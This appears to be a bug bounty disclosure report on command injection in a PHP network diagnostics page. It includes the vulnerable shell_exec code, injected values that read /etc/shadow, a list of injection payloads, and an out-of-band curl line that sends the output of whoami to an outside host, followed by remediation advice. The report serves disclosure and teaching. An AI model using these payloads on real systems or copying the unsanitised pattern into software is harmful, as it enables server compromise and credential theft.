---
title: "Command Injection in Network Diagnostics Tool"
url: "https://hackerone.com/reports/5678901"
vuln_class: "Command Injection"
tech: "PHP, Linux, Apache"
bounty: 4000
date: 2026-07-04
---

## Summary

A command injection vulnerability was found in the network diagnostics page. The `host` parameter was passed directly to the `ping` command via shell execution without sanitization.

## Steps to Reproduce

1. Navigate to `/tools/diagnostics`
2. Inject into host field: `127.0.0.1; id`
3. Observe command output in response
4. Escalate: `127.0.0.1; cat /etc/shadow`

## Vulnerable Code

```php
$host = $_POST['host'];
$output = shell_exec("ping -c 4 " . $host);
echo "<pre>$output</pre>";
```

## Payloads

Basic: `; id`
Pipe: `| whoami`
Subshell: `$(whoami)`
Backtick: `` `whoami` ``
Blind: `; sleep 5`
OOB: `; curl http://burpcollaborator.net/$(whoami)`

## Impact

Remote code execution as the web server user. Full server compromise.

## Remediation

- Never pass user input to `shell_exec`, `exec`, `system`, or `passthru`
- Use language-native ping libraries instead of shell commands
- Validate input against an allowlist of IP addresses
